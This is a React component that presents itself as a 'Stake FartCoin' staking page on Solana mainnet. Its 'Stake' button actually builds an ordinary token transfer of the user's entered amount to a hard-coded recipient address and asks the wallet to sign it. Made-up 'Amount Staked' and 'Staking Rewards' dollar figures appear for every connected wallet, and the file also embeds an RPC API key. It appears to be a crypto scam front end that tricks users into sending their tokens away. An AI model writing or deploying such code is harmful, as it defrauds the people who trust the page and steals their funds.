import { useState } from "react";
import {
  Connection,
  PublicKey,
  Transaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
} from "@solana/spl-token";

// === CONFIG ===
const NETWORK = "mainnet"; // or "devnet"
const SOLANA_RPC =
  NETWORK === "mainnet"
    ? "https://mainnet.helius-rpc.com/?api-key=c585dc98-220f-414d-845d-856c55daecb3"
    : "https://api.devnet.solana.com";

const TOKEN_MINT_ADDRESS = "9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump";
const RECIPIENT_ADDRESS = "AcAACQ1T37u18vV6zPVPLTqJba3THWzrMSL77wuoCKGW";
const DECIMALS = 6;

const TokenTransfer = ({ sender }) => {
  const [transactionHash, setTransactionHash] = useState(null);
  const [status, setStatus] = useState(null);
  const [amount, setAmount] = useState("");

  const transferTokens = async () => {
    if (!amount || isNaN(amount) || Number(amount) <= 0) {
      alert("Please enter a valid token amount.");
      return;
    }

    setStatus("Preparing transfer...");

    try {
      const connection = new Connection(SOLANA_RPC, "confirmed");
      const senderPubKey = new PublicKey(sender);
      const recipientPubKey = new PublicKey(RECIPIENT_ADDRESS);
      const tokenMint = new PublicKey(TOKEN_MINT_ADDRESS);

      const senderTokenAccount = await getAssociatedTokenAddress(tokenMint, senderPubKey);
      const recipientTokenAccount = await getAssociatedTokenAddress(tokenMint, recipientPubKey);

      const recipientInfo = await connection.getAccountInfo(recipientTokenAccount);

      const tx = new Transaction();

      if (!recipientInfo) {
        tx.add(
          createAssociatedTokenAccountInstruction(
            senderPubKey,
            recipientTokenAccount,
            recipientPubKey,
            tokenMint
          )
        );
      }

      tx.add(
        createTransferInstruction(
          senderTokenAccount,
          recipientTokenAccount,
          senderPubKey,
          Number(amount) * 10 ** DECIMALS
        )
      );

      tx.feePayer = senderPubKey;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      setStatus("Requesting wallet signature...");
      const { signature } = await window.solana.signAndSendTransaction(tx);

      setStatus("Confirming...");
      await connection.confirmTransaction(signature, "confirmed");

      setTransactionHash(signature);
      setStatus("Transaction successful!");
      setAmount("");
    } catch (error) {
      console.error("Transfer failed:", error);
      setStatus("Transfer failed — see console.");
    }
  };

  return (
    <div style={styles.container}>
      <h2 style={styles.heading}>Stake FartCoin</h2>

      {/* Static Wallet Summary */}
      {sender && (
        <div style={styles.stakingInfo}>
          <p><strong>Amount Staked:</strong> $4,165.79</p>
          <p><strong>Staking Rewards:</strong> $111.12</p>
        </div>
      )}

      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Enter token amount"
        min="0.000001"
        step="0.000001"
        style={styles.input}
      />

      <button onClick={transferTokens} style={styles.button}>
        Stake
      </button>

      {status && <p style={styles.status}>{status}</p>}

      {transactionHash && (
        <div style={styles.link}>
          <p>
            Transaction:{" "}
            <a
              href={`https://explorer.solana.com/tx/${transactionHash}?cluster=${NETWORK}`}
              target="_blank"
              rel="noopener noreferrer"
            >
              {transactionHash}
            </a>
          </p>
        </div>
      )}
      <p style={{ marginTop: "12px", fontStyle: "italic" }}>
        Note: Staking period is for 90 Days
      </p>
    </div>
  );
};

const styles = {
  container: {
    marginTop: "40px",
    textAlign: "center",
    padding: "30px",
    maxWidth: "500px",
    marginLeft: "auto",
    marginRight: "auto",
    background: "#f8f8f8",
    borderRadius: "16px",
    boxShadow: "0 6px 20px rgba(0,0,0,0.1)",
  },
  heading: {
    marginBottom: "20px",
    fontSize: "1.5rem",
    fontWeight: "600",
  },
  stakingInfo: {
    backgroundColor: "#eef2ff",
    padding: "15px",
    borderRadius: "10px",
    marginBottom: "20px",
    fontSize: "16px",
    color: "#333",
    fontWeight: "500",
  },
  input: {
    padding: "10px 16px",
    fontSize: "16px",
    borderRadius: "10px",
    border: "1px solid #ccc",
    marginBottom: "15px",
    width: "100%",
    boxSizing: "border-box",
  },
  button: {
    backgroundColor: "#5c6ac4",
    color: "#fff",
    padding: "10px 20px",
    fontSize: "16px",
    borderRadius: "10px",
    border: "none",
    cursor: "pointer",
  },
  status: {
    marginTop: "10px",
    fontStyle: "italic",
    color: "#333",
  },
  link: {
    marginTop: "12px",
    fontSize: "14px",
    wordBreak: "break-word",
  },
};

export default TokenTransfer;
